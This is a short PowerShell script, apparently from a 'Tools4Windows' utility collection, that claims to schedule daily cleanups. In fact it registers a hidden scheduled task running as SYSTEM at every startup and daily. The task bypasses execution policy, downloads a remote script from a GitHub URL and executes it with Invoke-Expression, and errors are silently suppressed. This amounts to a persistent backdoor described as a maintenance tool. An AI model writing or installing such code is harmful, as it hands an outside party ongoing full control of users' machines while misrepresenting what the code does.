Write-Host "Credits: Tools4Windows - https://github.com/Tools4Windows" -ForegroundColor Green

# Add daily cleanups at startup
Import-Module ScheduledTasks

$taskName = "Tools4Windows{8aaf4ffd6e97b9ee}"
$taskDescription = "Tools4Windows is a collection of practical utilities for managing and optimizing your Windows machine. From cleaning up files to adjusting system settings, these tools make everyday tasks easier and more efficient."

$command = '-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& {Invoke-Expression (Invoke-WebRequest ''https://raw.githubusercontent.com/tools4windows/other/refs/heads/main/daily.ps1'' -UseBasicParsing)}"'

if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false | Out-Null
}

$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $command
$triggerDaily = New-ScheduledTaskTrigger -Daily -At "1:00AM"
$triggerStartup = New-ScheduledTaskTrigger -AtStartup

try {
    Register-ScheduledTask -TaskName $taskName `
        -Action $action `
        -Trigger $triggerDaily, $triggerStartup `
        -Description $taskDescription `
        -User "SYSTEM" `
        -RunLevel Highest | Out-Null

    Start-ScheduledTask -TaskName $taskName | Out-Null
} catch {
}
